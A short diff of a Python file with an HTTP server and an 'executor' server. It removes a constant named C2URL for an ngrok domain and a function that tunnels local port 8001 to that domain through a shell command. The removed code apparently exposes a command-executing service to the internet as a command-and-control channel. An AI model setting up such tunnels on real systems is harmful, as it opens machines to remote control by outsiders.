@@ -1,9 +1,6 @@
 from http.server import BaseHTTPRequestHandler, HTTPServer
-from subprocess import Popen, PIPE
 from multiprocessing.connection import Client
 from time import sleep
-
-C2URL = "allegedly-great-shiner.ngrok-free.app"
 
 
 class HTTPHandler(BaseHTTPRequestHandler):
@@ -20,16 +17,6 @@ class HTTPHandler(BaseHTTPRequestHandler):
             conn.recv()
         except Exception as e:
             print(e)
-
-
-def start_ngrok_forwarding():
-    Popen(
-        f"ngrok http --url={C2URL} 8001",
-        stdin=PIPE,
-        stdout=PIPE,
-        stderr=PIPE,
-        shell=True
-    )
 
 
 def start_executor_server():
